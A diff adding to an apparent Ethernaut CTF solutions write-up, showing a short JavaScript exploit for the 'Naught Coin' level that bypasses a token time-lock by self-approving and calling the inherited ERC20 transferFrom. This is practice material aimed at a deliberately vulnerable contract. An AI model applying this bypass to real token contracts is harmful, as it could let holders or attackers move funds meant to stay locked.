@@ -91,3 +91,13 @@ See [Bypass Contract Size Check](https://solidity-by-example.org/hacks/contract-
 Compile [GatebreakerTwo.sol](./solutions/GatebreakerTwo.sol) and deploy it to the Rinkeby testnet with the level `instance` address as argument (constructor). Done!
 
 
+## 15. Naught Coin
+
+Circumvent the token lock using (non-overrided) ERC20 base class functions:
+```
+const playerBalance = await contract.balanceOf(player);
+await contract.approve(player, playerBalance); // approve self to transfer tokens using 'transferFrom' function
+
+const tokenReceiver = web3.eth.accounts.create(); // create new account to receive tokens
+await contract.transferFrom(player, tokenReceiver.address, playerBalance); // transfer tokens to new account
+```
